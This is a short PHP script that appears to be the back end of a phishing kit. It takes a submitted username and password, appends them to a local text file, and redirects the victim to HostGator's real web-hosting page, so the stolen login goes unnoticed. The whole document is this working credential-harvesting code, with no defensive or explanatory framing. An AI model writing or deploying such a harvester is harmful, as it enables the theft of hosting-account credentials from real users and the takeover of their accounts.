<?php

if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['password'])) 
{
$data = $_POST['username'].' - '.$_POST['password'].' - '.$_POST['password']."\r\n";

$ret = file_put_contents('notepad.txt',$data,FILE_APPEND | LOCK_EX);

if($ret === false){
   die('There was an error');
}
else {
   
echo "<script>document.location.href='https://www.hostgator.com/web-hosting/?'</script>";
}
}
?>